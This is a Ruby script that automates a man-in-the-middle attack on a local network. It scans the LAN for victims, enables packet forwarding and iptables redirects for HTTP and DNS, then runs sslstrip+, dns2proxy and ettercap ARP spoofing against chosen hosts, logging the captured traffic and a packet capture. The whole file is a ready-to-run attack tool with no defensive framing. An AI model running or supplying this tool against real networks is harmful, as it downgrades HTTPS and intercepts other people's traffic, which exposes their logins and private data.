#!/usr/bin/ruby

require "rubygems"
require "highline/import"

#Script header
system("clear")
puts 
puts "#{$0}"
puts
puts "*** MITM-SSL auto-script ***"
puts

def exit_
  puts "Exiting..."
  exit
end

def menu_iface
  choices_array = Array.new
  IO.popen("netstat -i | tail -n +3 | awk {'print $1'}").each do |line|
    choices_array << line.chomp
  end
  
  choose do |menu|
    menu.header = "** Choose network device"
    menu.prompt = "Enter choice: "
  
    choices_array.each do |item|
      menu.choice(item)
    end
    menu.choice("Exit...") { exit_ }
  end
end

def menu_gateway
  gateway_ip = %x(ip route show | grep default | awk '{ print $3}').chomp

  choose do |menu|
    menu.header = "** Verify gateway IP"
    menu.prompt = "Enter choice: "
  
    menu.choice(gateway_ip)
    menu.choice("Enter IP manually...") {
      print "Enter correct gateway IP: "
      gateway_ip = gets.chomp
    }
    menu.choice("Exit...") { exit_ }
  end
end

def menu_scan_targets
  puts "Scanning LAN Network..."
  choices_array = Array.new
  IO.popen("arp-scan -R -N -l -r 4 -t 1000 -I #{$net_intf} | awk '/([a-f0-9]{2}:){5}[a-f0-9]{2}/ {print $1}'").each do |line|
    choices_array << line.chomp
  end
  
  choose do |menu|
    menu.header = "** Choose network target(s)"
    menu.index_suffix = "- "
    menu.prompt = "Enter choice: "
  
    choices_array.each do |item|
      menu.choice(item)
    end
    menu.choice("** ALL **") { return "" }
    menu.choice("Exit...") { exit_ }
  end
  
end

# Script interactive configuration section 

$session= "test1"

$net_intf = menu_iface
puts
$net_gateway = menu_gateway

puts
puts "Current configuration:"
puts "NET_INTF:\t#{$net_intf}"
puts "NET_GATEWAY:\t#{$net_gateway}"
puts
confirm = ask("** Scan LAN for target(s)? [Y (Yes)/E (Edit)/A (All)/Q (Quit)] ") { |yeaq| yeaq.limit = 1, yeaq.validate = /[yeaq]/i }
  case confirm.downcase
  when "y"
    $net_targets = menu_scan_targets
  when "a"
    $net_targets = ""
  when "e"
    puts "Enter target manually:"
    $net_targets = gets.chomp!
  else
    exit_
  end
puts


# Starting externals tools and MITM context

system("mkdir ./#{$session}/")

puts
puts "Setting IPTABLES packet forwarding..."
puts %x(echo 1 > /proc/sys/net/ipv4/ip_forward)
puts %x(echo 0 > /proc/sys/net/ipv6/conf/wlan0/use_tempaddr)
puts %x(iptables -v -t nat -A PREROUTING -i eth0 -p tcp --destination-port 80 -j REDIRECT --to-ports 10000)
puts %x(iptables --table nat --append PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53)

puts
puts "Starting sslstrip+..."
pid = fork do
    IO.popen("sslstrip -f -s -k -w ./#{$session}/#{$session}.log").each do |line|
      puts line.chomp
    end
end
puts "PID : #{pid}"

sleep 3

puts
puts "Starting dns2proxy..."
pid1 = fork do
    cmd = "cd ./dns2proxy/ && python ./dns2proxy.py && export PID_DNS2PROXY=$!"
    puts "CMD: #{cmd}"
    IO.popen("#{cmd}").each do |line|
      puts line.chomp
    end
end
puts "PID : #{pid1}"

sleep 3

puts
puts "Starting ettercap..."
pid2 = fork do
    cmd = "ettercap -Tq -P autoadd -i #{$net_intf} -w ./#{$session}/#{$session}.pcap -L ./#{$session}/#{$session} -M arp:remote /#{$net_gateway}// /#{$net_targets}//"
    puts "CMD: #{cmd}"
    IO.popen("#{cmd}").each do |line|
      puts line.chomp
    end
end
puts "PID : #{pid2}"



puts "Press anything to stop:"
gets

Process.wait



puts "Stopping processes..."

Process.kill("HUP", pid)
Process.kill("HUP", pid1)
Process.kill("HUP", pid2)
Process.wait

system("killall sslstrip")
system("killall python")
system("killall ettercap")


puts "Setting IPTABLES packet forwarding to OFF..."
puts %x(echo 0 > /proc/sys/net/ipv4/ip_forward)
puts %x(echo 1 > /proc/sys/net/ipv6/conf/wlan0/use_tempaddr)
puts %x(iptables -t nat -F)

puts "Terminated..."


















